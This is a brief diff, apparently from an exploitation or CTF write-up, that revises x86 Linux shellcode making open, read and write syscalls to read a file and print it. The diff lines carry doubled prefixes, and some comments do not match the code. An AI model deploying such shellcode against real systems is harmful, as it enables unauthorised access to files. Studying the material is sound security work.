@@ -58,30 +58,30 @@ with the stack pointer. We also replaced the syscall macros with their respectiv
     xor ecx, ecx
     xor edx, edx
     /* call open() */
- -  push SYS_open /* 5 */
- +  push 0x5
+-   push SYS_open /* 5 */
++   push 0x5
     pop eax
     int 0x80
     /* call read(1, 0x3c, 0x64) */
- -   push SYS_read /* 3 */
- +   push 0x3
+-   push SYS_read /* 3 */
++   push 0x3
     pop eax
- -  push 1
- -  pop ebx
- -  push 0x3c
- -  pop ecx
- +  mov ecx, esp
+-   push 1
+-   pop ebx
+-   push 0x3c
+-   pop ecx
++   mov ecx, esp
     push 0x64
     pop edx
     int 0x80
     /* call write(1, 0x3c, 0x64) */
- -   push SYS_write /* 4 */
- +   push 0x4
+-   push SYS_write /* 4 */
++   push 0x4
     pop eax
     push 1
     pop ebx
- -  push 0x3c
- +  pop ecx
+-   push 0x3c
++   pop ecx
     push 0x64
     pop edx
     int 0x80
